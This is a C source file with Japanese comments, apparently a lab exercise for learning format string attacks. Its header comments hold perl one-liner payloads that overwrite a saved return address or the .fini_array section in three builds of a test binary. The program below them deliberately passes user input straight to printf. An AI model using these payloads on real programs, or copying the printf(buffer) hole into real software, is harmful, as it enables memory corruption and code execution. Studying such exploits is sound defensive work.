/***** 以下の例は再コンパイルし直すと動作しなくなるので、多少の調節が必要 *****/
/***** フォーマット文字列攻撃を利用したリターンアドレスの書き換え例 *****/
/***** 書き込み先アドレスと%xの文字数指定部分を自由に変化させることで任意のアドレスに任意の値を書き込むことができる *****/

//位置依存コード用
//./target_not_pie $(perl -e 'print "\xec\xcc\xff\xff" . "\xee\xcc\xff\xff" . "%8x." x 188 . "%54148x%187\$hn" . "%9687x%188\$hn"')

//静的リンクされた実行ファイル用
//./target_static  $(perl -e 'print "\xbc\xcc\xff\xff" . "\xbe\xcc\xff\xff" . "%8x." x 194 . "%54096x%193\$hn" . "%9685x%194\$hn" . "aa"')

//位置独立コード用
//./target_pie     $(perl -e 'print "\xfc\xcc\xff\xff" . "\xfe\xcc\xff\xff" . "%8x." x 188 . "%54156x%185\$hn" . "%9679x%186\$hn"')



/***** 以下の例は再コンパイルし直すと動作しなくなるので、多少の調節が必要 *****/
/***** フォーマット文字列攻撃を利用して.fini_arrayを書き換える例 *****/
/***** RELROによって.fini_arrayが書き込み禁止に設定してあるので、静的リンクした実行ファイル以外ではコンパイル時に -Wl,-z,norelro を指定する必要がある *****/

//位置依存コード用
//./target_not_pie $(perl -e 'print "\x10\x9b\x04\x08" . "\x12\x9b\x04\x08" . "%8x." x 188 . "%54148x%187\$hn" . "%9687x%188\$hn"')

//静的リンクされた実行ファイル用
//./target_static  $(perl -e 'print "\xb0\x86\x0d\x08" . "\xb2\x86\x0d\x08" . "%8x." x 194 . "%54096x%193\$hn" . "%9685x%194\$hn" . "aa"')

//位置独立コード用
//./target_pie     $(perl -e 'print "\x04\x6c\x55\x56" . "\x06\x6c\x55\x56" . "%8x." x 188 . "%54156x%185\$hn" . "%9679x%186\$hn"')



#include<stdio.h>
#include<stdlib.h>

#define RETURN_ADDRESS_OFFSET 128

//コンストラクタの場合は優先順位を指定できるけど、デストラクタの場合はなぜか無視される
__attribute__ ((constructor(101))) void func1(void);
__attribute__ ((constructor(102))) void func2(void);
__attribute__ (( destructor(101))) void func1(void);
__attribute__ (( destructor(102))) void func2(void);

void func1(void){
	printf("func1 is called\n");
}

void func2(void){
	printf("func2 is called\n");
}

int main(void){
	long test_value = 0xcccccccccccccccc;
	char buffer[1000];

	printf("一行の文字列を入力してください\n");
	fgets(buffer, 1000, stdin);
	
	printf("特定のメモリを書き換える前に以下のデバッグ変数で調整しておくといいでしょう\n");
	printf("&test_value = %p, test_value = %016lx\n", &test_value, test_value);
	printf("リターンアドレスが保存されていると思われるアドレス = %p, リターンアドレスの値 = 0x%016lx\n", &test_value + RETURN_ADDRESS_OFFSET, *(&test_value + RETURN_ADDRESS_OFFSET));

	//このプログラムへの入力にパイプを使用する場合、シェルを獲得したとしてもシェルが即座に閉じてしまう
	//この場合は入力したい文字列を一旦テキストファイルに保存してから、ハイフンを指定したcatコマンドをパイプするといい
	printf("引数の文字列は以下のようになります\n");
	printf(buffer);
	printf("\n");

	printf("デバッグ変数は次のように書き換わりました\n");
	printf("&test_value = %p, test_value = %016lx\n", &test_value, test_value);
	printf("リターンアドレスが保存されていると思われるアドレス = %p, リターンアドレスの値 = 0x%016lx\n", &test_value + RETURN_ADDRESS_OFFSET, *(&test_value + RETURN_ADDRESS_OFFSET));

	return 0;
}
